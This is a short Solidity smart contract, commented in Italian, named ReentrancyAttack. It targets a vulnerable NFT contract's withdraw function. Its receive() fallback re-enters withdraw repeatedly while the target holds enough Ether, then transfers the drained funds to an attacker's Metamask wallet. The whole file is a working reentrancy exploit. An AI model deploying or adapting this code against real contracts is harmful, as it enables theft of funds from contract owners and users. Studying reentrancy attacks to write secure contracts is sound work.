// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IDynamicNFT {
    function withdraw(uint256 tokenId, uint256 _amount) external;
}

contract ReentrancyAttack {
    IDynamicNFT public target; // Indirizzo del contratto vulnerabile
    uint256 public targetTokenId; // ID dell'NFT attaccato
    address payable public attackerWallet; // Wallet Metamask dell'attaccante
    uint256 public attackAmount; // Quantità di Ether da prelevare per ogni iterazione

    constructor(address _target, uint256 _tokenId, address payable _attackerWallet, uint256 _attackAmount) {
        target = IDynamicNFT(_target);
        targetTokenId = _tokenId;
        attackerWallet = _attackerWallet;
        attackAmount = _attackAmount;
    }

    /// @notice Attiva l'attacco specificando l'importo da prelevare per ogni iterazione
    function attack() public {
        target.withdraw(targetTokenId, attackAmount);
    }

    /// @notice Funzione fallback per eseguire l'attacco di rientranza
    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(targetTokenId, attackAmount);
        } else {
            // Invia i fondi al wallet dell'attaccante
            attackerWallet.transfer(address(this).balance);
        }
    }
}
